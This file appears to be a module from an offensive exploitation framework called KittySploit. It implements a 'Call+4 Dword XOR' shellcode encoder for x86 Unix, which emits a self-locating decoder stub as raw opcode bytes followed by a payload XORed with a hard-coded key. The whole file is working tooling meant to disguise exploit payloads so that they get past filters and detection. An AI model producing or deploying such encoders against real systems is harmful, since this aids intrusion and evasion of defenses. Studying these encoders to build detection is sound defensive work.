from kittysploit import *

class Module(Encoder):


    __info__ = {
            "name": "Call+4 Dword XOR Encoder",
            'description': 'Call+4 Dword XOR Encoder',
            'author': 'KittySploit Team',
            'arch': Arch.X86,
            'platform': Platform.UNIX,
        }

    def encode(self, payload):
        xor_key = b"\xc0\xb2\xf9\x99"
        buf = hex(int(((len(payload) - 1 )/ 4) - 5))
        decoder = self.asm("xor ecx, ecx", "x86")
        decoder += self.asm(f"sub ecx, -{buf}", "x86")
        decoder += b"\xe8\xff\xff\xff" # call $+4
        decoder += b"\xff\xc0"         # inc eax
        decoder += b"\x5e"             # pop esi
        decoder += b"\x81\x76\x0e"     # xor [esi + 0xe], xor_key
        decoder += xor_key
        decoder += b"\x83\xee\xfc"     # sub esi, -4
        decoder += b"\xe2\xf4"         # loop xor
        decoder += self.xor_key_bytes(payload, xor_key)
        return decoder